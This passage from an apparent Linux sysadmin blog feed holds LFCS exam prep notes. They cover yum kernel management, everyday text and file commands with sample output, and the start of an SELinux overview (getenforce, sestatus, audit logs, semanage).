<li>see past transactions</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum history</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list available kernels</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum list kernel
</span><span class='line'> Loaded plugins: langpacks, product-id, search-disabled-repos, subscription-
</span><span class='line'>               : manager
</span><span class='line'> Repodata is over 2 weeks old. Install yum-cron? Or run: yum makecache fast
</span><span class='line'> Installed Packages
</span><span class='line'> kernel.x86_64              3.10.0-514.el7                    @anaconda/7.3      
</span><span class='line'> kernel.x86_64              3.10.0-514.26.2.el7               @rhel-7-server-rpms
</span><span class='line'> Available Packages
</span><span class='line'> kernel.x86_64              3.10.0-693.2.2.el7                rhel-7-server-rpms</span></code></pre></td></tr></table></div></figure>


<ul>
<li>install new kernel and set it as default boot choice</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum --enablerepo=kernelrepo install kernelname</span></code></pre></td></tr></table></div></figure>


<p>Set <code>GRUB_DEFAULT=0</code> to make it default, 1 otherwise</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ Fine day for friends. So-so day for \
</span><span class='line'>\ you.                                /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Essential commands]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/24/lfcs-prep-essential-commands/"/>
    <updated>2018-02-24T16:46:53-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/24/lfcs-prep-essential-commands</id>
    <content type="html"><![CDATA[<p>Various commands for the LFCS Essential Commands domain, which at the time of this post can be found at <a href="https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf">https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf</a></p>

<!-- more-->


<p><img class="center" src="http://chousensha.github.io/images/sysadmin/cmds.png" title="linux cmds" alt="cmd essentials"></p>

<h4>cut</h4>

<blockquote><p>remove sections from each line of files</p></blockquote>

<ul>
<li>select only relevant fields of output</li>
</ul>


<p>Here I&rsquo;m looking only at users and their home directories from /etc/passwd:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/passwd | cut -d: -f1,6 | tail -n 5
</span><span class='line'>apache:/usr/share/httpd
</span><span class='line'>nixer:/home/nixer
</span><span class='line'>lfcs:/home/lfcs
</span><span class='line'>squid:/var/spool/squid
</span><span class='line'>tom:/home/tom</span></code></pre></td></tr></table></div></figure>


<h4>sed</h4>

<blockquote><p>stream editor for filtering and transforming text</p></blockquote>

<ul>
<li>substitute all occurrences in a file to something else: <code>sed &rsquo;s/original/replacement/flag' filename</code></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat text.txt
</span><span class='line'>Peace is a lie, there is only passion.
</span><span class='line'>Through passion, I gain strength.
</span><span class='line'>Through strength, I gain power.
</span><span class='line'>Through power, I gain victory.
</span><span class='line'>Through victory, my chains are broken.</span></code></pre></td></tr></table></div></figure>


<p>Changed the I to a we and redirect to a new file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sed 's/I/we/g' text.txt &gt; altered.txt
</span><span class='line'>cat altered.txt
</span><span class='line'>Peace is a lie, there is only passion.
</span><span class='line'>Through passion, we gain strength.
</span><span class='line'>Through strength, we gain power.
</span><span class='line'>Through power, we gain victory.
</span><span class='line'>Through victory, my chains are broken.
</span><span class='line'>The Force shall free me.</span></code></pre></td></tr></table></div></figure>


<h4>diff</h4>

<blockquote><p>compare files line by line</p></blockquote>

<ul>
<li>compare files side by side</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>diff -y text.txt altered.txt
</span><span class='line'>Peace is a lie, there is only passion.                Peace is a lie, there is only passion.
</span><span class='line'>Through passion, I gain strength.               | Through passion, we gain strength.
</span><span class='line'>Through strength, I gain power.                     | Through strength, we gain power.
</span><span class='line'>Through power, I gain victory.                      | Through power, we gain victory.
</span><span class='line'>Through victory, my chains are broken.                Through victory, my chains are broken.
</span><span class='line'>The Force shall free me.                  The Force shall free me.</span></code></pre></td></tr></table></div></figure>


<h4>man</h4>

<blockquote><p>an interface to the on-line reference manuals</p></blockquote>

<ul>
<li>search manpages by keyword</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>man -k print | head -n 5
</span><span class='line'>fmtmsg (3)           - print formatted error messages
</span><span class='line'>isprint (3)          - character classification routines
</span><span class='line'>iswprint (3)         - test for printing wide character
</span><span class='line'>netstat (8)          - Print network connections, routing tables, interface statistics, masquerade connections, and multicast memberships
</span><span class='line'>abrt-action-list-dsos (1) - Prints out DSO from mapped memory regions.</span></code></pre></td></tr></table></div></figure>


<h4>umask</h4>

<blockquote><p>display or set the file creation mask</p></blockquote>

<p>It can be used to remove, but not add permissions</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>umask
</span><span class='line'>0022
</span><span class='line'>umask -S
</span><span class='line'>u=rwx,g=rx,o=rx</span></code></pre></td></tr></table></div></figure>


<h4>info</h4>

<blockquote><p>read Info documents</p></blockquote>

<h4>touch</h4>

<blockquote><p>Update the access and modification times of each FILE to the current time</p></blockquote>

<ul>
<li>r FILE &ndash;>  use this file&rsquo;s times instead of current time</li>
</ul>


<h4>whatis</h4>

<blockquote><p>display manual page descriptions</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>whatis ip
</span><span class='line'>ip (7)               - Linux IPv4 protocol implementation
</span><span class='line'>ip (8)               - show / manipulate routing, devices, pol...</span></code></pre></td></tr></table></div></figure>


<h4>apropos</h4>

<blockquote><p>search the manual page names and descriptions</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apropos network | tail
</span><span class='line'>teamnl (8)           - team network device Netlink interface tool
</span><span class='line'>tracepath (8)        - traces path to a network host discoveri...
</span><span class='line'>tracepath6 (8)       - traces path to a network host discoveri...
</span><span class='line'>traceroute (8)       - print the route packets trace to networ...
</span><span class='line'>traceroute6 (8)      - print the route packets trace to networ...
</span><span class='line'>tshark (1)           - Dump and analyze network traffic
</span><span class='line'>umount.nfs (8)       - unmount a Network File System
</span><span class='line'>usernetctl (8)       - allow a user to manipulate a network in...
</span><span class='line'>wget (1)             - The non-interactive network downloader.
</span><span class='line'>wireshark (1)        - Interactively dump and analyze network ...</span></code></pre></td></tr></table></div></figure>


<h4>uniq</h4>

<blockquote><p>report or omit repeated lines</p></blockquote>

<ul>
<li><p>D # print all duplicate lines</p></li>
<li><p>u # only print unique lines</p></li>
<li><p>it won&rsquo;t detect repeated lines unless they are adjacent. Sort first</p></li>
</ul>


<h4>sort</h4>

<blockquote><p>sort lines of text files</p></blockquote>

<h4>fmt</h4>

<blockquote><p>simple optimal text formatter</p></blockquote>

<ul>
<li>u # uniform spacing: one space between words, two after sentences</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@tron ~]# cat test.txt
</span><span class='line'>Test.     Next sentence.   This    doesn't   look       right
</span><span class='line'>[root@tron ~]# fmt -u test.txt
</span><span class='line'>Test.  Next sentence.  This doesn't look right</span></code></pre></td></tr></table></div></figure>


<h4>nl</h4>

<blockquote><p>number lines of files</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nl test.txt
</span><span class='line'>     1    First line
</span><span class='line'>
</span><span class='line'>     2    Second line
</span><span class='line'>
</span><span class='line'>     3    Third line</span></code></pre></td></tr></table></div></figure>


<h4>updatedb</h4>

<blockquote><p>creates or updates a database used by locate(1). It&rsquo;s usually  run daily by cron(8) to update the default database.</p></blockquote>

<h4>tty</h4>

<blockquote><p>print the file name of the terminal connected to standard input</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tty
</span><span class='line'>/dev/pts/1</span></code></pre></td></tr></table></div></figure>


<h4>type</h4>

<blockquote><p>indicate how each name would be interpreted  if used as a command name</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>type ls
</span><span class='line'>ls is aliased to `ls --color=auto'</span></code></pre></td></tr></table></div></figure>


<h4>tree</h4>

<blockquote><p>list contents of directories in a tree-like format</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tree
</span><span class='line'>.
</span><span class='line'> anaconda-ks.cfg
</span><span class='line'> Desktop
</span><span class='line'> Documents
</span><span class='line'>  archive_file
</span><span class='line'>  arhive.tar.gz
</span><span class='line'>  Documents
</span><span class='line'>   archive_file
</span><span class='line'>   test.txt
</span><span class='line'>  test.txt
</span><span class='line'> Downloads
</span><span class='line'> initial-setup-ks.cfg
</span><span class='line'> Music
</span><span class='line'> openscap_data
</span><span class='line'>  eval_remediate_results.xml
</span><span class='line'> Pictures
</span><span class='line'> Public
</span><span class='line'> Templates
</span><span class='line'> test.txt
</span><span class='line'> Videos</span></code></pre></td></tr></table></div></figure>


<h4>wc</h4>

<blockquote><p>print newline, word, and byte counts for each file</p></blockquote>

<ul>
<li>l # lines</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wc -l /etc/hosts
</span><span class='line'>2 /etc/hosts</span></code></pre></td></tr></table></div></figure>


<ul>
<li>w # words</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wc -w test.txt
</span><span class='line'>6 test.txt</span></code></pre></td></tr></table></div></figure>


<h4>grep</h4>

<blockquote><p>print lines matching a pattern</p></blockquote>

<ul>
<li><p>-E # Interpret PATTERN as an extended regular  expression</p></li>
<li><p>-i # ignore case</p></li>
<li><p>-n # prefix each line of output with its line number</p></li>
<li><p>list items that begin with certain PATTERN</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum list installed | grep ^kernel
</span><span class='line'>kernel.x86_64                        3.10.0-514.el7          @anaconda/7.3      
</span><span class='line'>kernel.x86_64                        3.10.0-514.26.2.el7     @rhel-7-server-rpms
</span><span class='line'>kernel-devel.x86_64                  3.10.0-514.el7          @anaconda/7.3      
</span><span class='line'>kernel-devel.x86_64                  3.10.0-514.26.2.el7     @rhel-7-server-rpms
</span><span class='line'>kernel-headers.x86_64                3.10.0-514.26.2.el7     @rhel-7-server-rpms
</span><span class='line'>kernel-tools.x86_64                  3.10.0-514.26.2.el7     @rhel-7-server-rpms
</span><span class='line'>kernel-tools-libs.x86_64             3.10.0-514.26.2.el7     @rhel-7-server-rpms</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list items that end with certain PATTERN</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum list installed | grep x86_64$
</span><span class='line'>NetworkManager-libreswan-gnome.x86_64
</span><span class='line'>iscsi-initiator-utils-iscsiuio.x86_64
</span><span class='line'>libreport-plugin-reportuploader.x86_64
</span><span class='line'>libreport-rhel-anaconda-bugzilla.x86_64
</span><span class='line'>libvirt-daemon-driver-interface.x86_64
</span><span class='line'>libvirt-daemon-driver-nwfilter.x86_64
</span><span class='line'>openlmi-indicationmanager-libs.x86_64
</span><span class='line'>sane-backends-drivers-scanners.x86_64
</span><span class='line'>subscription-manager-initial-setup-addon.x86_64</span></code></pre></td></tr></table></div></figure>


<ul>
<li>grep something that begins and ends with a certain PATTERN, but with variable content in the middle</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep -E '^de......tion$' /usr/share/dict/words | head -n 5
</span><span class='line'>deactivation
</span><span class='line'>dealkylation
</span><span class='line'>deallocation
</span><span class='line'>deambulation
</span><span class='line'>deammonation</span></code></pre></td></tr></table></div></figure>


<h4>find</h4>

<blockquote><p>search for files in a directory hierarchy</p></blockquote>

<ul>
<li><p>find / -perm -6000 # find SUID and SGID</p></li>
<li><p>find / -size 10M -type f # find files whose size is 10 megabytes</p></li>
<li><p>type d/c/l/f # directories/character devices/symlinks/files</p></li>
<li><p>user <username> # owned by username</p></li>
<li><p>exec <cmd> &lsquo;{}&rsquo; + # execute cmd on results of the find cmd</p></li>
<li><p>print # print full filename to stdout, followed by newline</p></li>
<li><p>name &ldquo;value&rdquo; # find values that start with the name</p></li>
<li><p>iname # ignore case</p></li>
<li><p>not -name # not <name></p></li>
<li><p>size +/&ndash; c/k/m/G # size in bytes; + =larger than, &ndash; = smaller than; c = bytes, k = kilobytes, m = megabytes, G = gigabytes</p></li>
<li><p>mtime # modification time</p></li>
<li><p>atime # access time</p></li>
</ul>


<h4>which</h4>

<blockquote><p>shows the full path of (shell) commands. It does this by searching for an executable or script in the directories listed in the environment variable PATH</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>which python
</span><span class='line'>/usr/bin/python</span></code></pre></td></tr></table></div></figure>


<h4>locate</h4>

<blockquote><p>find files by name. Reads one or more databases prepared by updatedb(8) and writes file names matching at least one of the PATTERNs to  standard  output,  one  per line.</p></blockquote>

<p>It is much faster than find. On most systems, <em>locate</em> is a link to <em>slocate</em>, which includes security features that prevent users from seeing files in directories they shouldn&rsquo;t be able to access</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>locate tcpdump
</span><span class='line'>/usr/sbin/tcpdump
</span><span class='line'>/usr/share/bash-completion/completions/tcpdump
</span><span class='line'>/usr/share/doc/tcpdump-4.5.1
</span><span class='line'>/usr/share/doc/systemtap-client-3.0/examples/network/tcpdumplike.meta
</span><span class='line'>/usr/share/doc/systemtap-client-3.0/examples/network/tcpdumplike.stp
</span><span class='line'>/usr/share/doc/tcpdump-4.5.1/CHANGES
</span><span class='line'>/usr/share/doc/tcpdump-4.5.1/CREDITS
</span><span class='line'>/usr/share/doc/tcpdump-4.5.1/LICENSE
</span><span class='line'>/usr/share/doc/tcpdump-4.5.1/README.md
</span><span class='line'>/usr/share/man/man8/tcpdump.8.gz
</span><span class='line'>/usr/share/mime/application/vnd.tcpdump.pcap.xml
</span><span class='line'>/var/cache/man/cat8/tcpdump.8.gz</span></code></pre></td></tr></table></div></figure>


<h4>tar</h4>

<blockquote><p>saves many files together into a single tape or disk archive, and can restore individual files from the archive</p></blockquote>

<ul>
<li><p>c # create archive</p></li>
<li><p>t # list the contents of an archive</p></li>
<li><p>x # extract files from archive</p></li>
<li><p>v # verbosely list files processed</p></li>
<li><p>z # gzip compression</p></li>
<li><p>j # bzip compression</p></li>
<li><p>A # append files to existing archive</p></li>
<li><p>file # archive file</p></li>
<li><p>p # preserve permissions</p></li>
<li><p>W # attempt to verify the archive after writing it</p></li>
<li><p>&mdash;exclude=PATTERN # exclude files</p></li>
<li><p>create archive</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tar cvzf arhive.tar.gz Documents/
</span><span class='line'>Documents/
</span><span class='line'>Documents/test.txt
</span><span class='line'>Documents/archive_file
</span><span class='line'>[root@tron ~]# ls</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list files in archive_file</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tar tvf arhive.tar.gz
</span><span class='line'>drwxr-xr-x root/root         0 2017-09-08 17:54 Documents/
</span><span class='line'>-rw-r--r-- root/root        36 2017-09-08 17:53 Documents/test.txt
</span><span class='line'>-rw-r--r-- root/root         0 2017-09-08 17:54 Documents/archive_file</span></code></pre></td></tr></table></div></figure>


<ul>
<li>decompress gzip archive: <code>tar xzvf arhive.tar.gz</code></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Kindness is a language which the deaf \
</span><span class='line'>| can hear and the blind can read.      |
</span><span class='line'>|                                       |
</span><span class='line'>\ -- Mark Twain                         /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Managing SELinux]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/23/lfcs-prep-managing-selinux/"/>
    <updated>2018-02-23T13:18:55-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/23/lfcs-prep-managing-selinux</id>
    <content type="html"><![CDATA[<p>In this post we&rsquo;ll go over using SELinux to manage the security of a Linux system.</p>

<p>NSA Security-Enhanced Linux or SELinux is a mandatory access control architecture controlled through the <code>/etc/selinux/config</code> file.</p>

<!-- more -->


<p>Let&rsquo;s take a peek at the file on my box:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/selinux/config 
</span><span class='line'>
</span><span class='line'># This file controls the state of SELinux on the system.
</span><span class='line'># SELINUX= can take one of these three values:
</span><span class='line'>#     enforcing - SELinux security policy is enforced.
</span><span class='line'>#     permissive - SELinux prints warnings instead of enforcing.
</span><span class='line'>#     disabled - No SELinux policy is loaded.
</span><span class='line'>SELINUX=enforcing
</span><span class='line'># SELINUXTYPE= can take one of three two values:
</span><span class='line'>#     targeted - Targeted processes are protected,
</span><span class='line'>#     minimum - Modification of targeted policy. Only selected processes are protected. 
</span><span class='line'>#     mls - Multi Level Security protection.
</span><span class='line'>SELINUXTYPE=targeted </span></code></pre></td></tr></table></div></figure>


<p>If SELinux is disabled and then enabled, all the files inside the filesystem will need to be re-labeled.</p>

<p>You can adjust SELinux with many commands and utilities:</p>

<h3>getenforce</h3>

<blockquote><p>get the current mode of SELinux</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>getenforce
</span><span class='line'>Enforcing</span></code></pre></td></tr></table></div></figure>


<h3>sestatus</h3>

<blockquote><p>SELinux status tool</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sestatus
</span><span class='line'>SELinux status:                 enabled
</span><span class='line'>SELinuxfs mount:                /sys/fs/selinux
</span><span class='line'>SELinux root directory:         /etc/selinux
</span><span class='line'>Loaded policy name:             targeted
</span><span class='line'>Current mode:                   enforcing
</span><span class='line'>Mode from config file:          enforcing
</span><span class='line'>Policy MLS status:              enabled
</span><span class='line'>Policy deny_unknown status:     allowed
</span><span class='line'>Max kernel policy version:      28</span></code></pre></td></tr></table></div></figure>


<h3>setenforce</h3>

<blockquote><p>modify the mode SELinux is running in</p>

<p>Use Enforcing or 1 to put SELinux in enforcing mode.
Use Permissive or 0 to put SELinux in permissive mode</p></blockquote>

<h3>SELinux log files:</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tail /var/log/audit/audit.log | grep AVC
</span><span class='line'>type=USER_AVC msg=audit(1518200447.761:276): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=system_u:system_r:init_t:s0 msg='avc:  denied  { status } for auid=n/a uid=0 gid=0 path="/etc/fstab" cmdline="systemctl show --property=RequiredBy -- -.mount" scontext=system_u:system_r:initrc_t:s0 tcontext=unconfined_u:object_r:etc_t:s0 tclass=service  exe="/usr/lib/systemd/systemd" sauid=0 hostname=? addr=? terminal=?'</span></code></pre></td></tr></table></div></figure>


<h3>ausearch</h3>

<blockquote><p>a tool to query audit daemon logs</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ausearch -m avc
</span><span class='line'>----
</span><span class='line'>time-&gt;Wed Aug  3 15:23:45 2016
</span><span class='line'>type=SYSCALL msg=audit(1470227025.724:584): arch=c000003e syscall=49 success=no exit=-13 a0=6 a1=7efd495a23a8 a2=1c a3=7fff168b531c items=0 ppid=1 pid=8541 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="httpd" exe="/usr/sbin/httpd" subj=system_u:system_r:httpd_t:s0 key=(null)
</span><span class='line'>type=AVC msg=audit(1470227025.724:584): avc:  denied  { name_bind } for  pid=8541 comm="httpd" src=8888 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:unreserved_port_t:s0 tclass=tcp_socket</span></code></pre></td></tr></table></div></figure>


<h3>restorecon</h3>

<blockquote><p>restore file(s) default SELinux security contexts.</p></blockquote>

<h3>chcon</h3>

<blockquote><p>change file SELinux security context</p></blockquote>

<h3>semanage</h3>

<blockquote><p>SELinux Policy Management tool</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>semanage boolean -l | grep nfs
</span><span class='line'>xen_use_nfs                    (off  ,  off)  Allow xen to use nfs
</span><span class='line'>mpd_use_nfs                    (off  ,  off)  Allow mpd to use nfs
</span><span class='line'>virt_use_nfs                   (off  ,  off)  Allow virt to use nfs
</span><span class='line'>use_nfs_home_dirs              (off  ,  off)  Allow use to nfs home dirs
</span><span class='line'>ksmtuned_use_nfs               (off  ,  off)  Allow ksmtuned to use nfs
</span><span class='line'>nfsd_anon_write                (off  ,  off)  Allow nfsd to anon write
</span><span class='line'>git_system_use_nfs             (off  ,  off)  Allow git to system use nfs
</span><span class='line'>git_cgi_use_nfs                (off  ,  off)  Allow git to cgi use nfs
</span><span class='line'>logrotate_use_nfs              (off  ,  off)  Allow logrotate to use nfs
